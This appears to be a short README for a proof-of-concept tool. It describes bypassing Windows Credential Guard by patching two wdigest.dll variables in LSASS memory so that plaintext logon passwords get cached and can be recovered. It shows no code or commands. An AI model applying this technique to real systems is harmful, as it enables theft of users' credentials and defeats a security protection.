BypassCredGuard - Credential Guard Bypass Via Patching Wdigest Memory

## Background
Adam Chester wrote an article called "Exploring Mimikatz - Part 1 - WDigest" about memory patching to enable UseLogonCredential
and make Wdigest cache cleartext credentials intrigued me. The wdigest.dll module loaded by the LSASS process has two interesting
global variables: `g_fParameter_useLogonCredential` and `g_IsCredGuardEnabled`, their role is self-evident from the name alone,
the former is used to determine whether the clear text password should be stored in memory , the latter holds the state of the
Windows Defender Credential Guard within the module, and Wdigest plaintext password caching can be enabled on systems with
Credential Guard by patching the values of these two global variables in memory.

## Letâ€™s see it in action
Run the POC we wrote on the system with Credential Guard protection enabled.
When the user enters the username and password to log in again, we get his plaintext password again
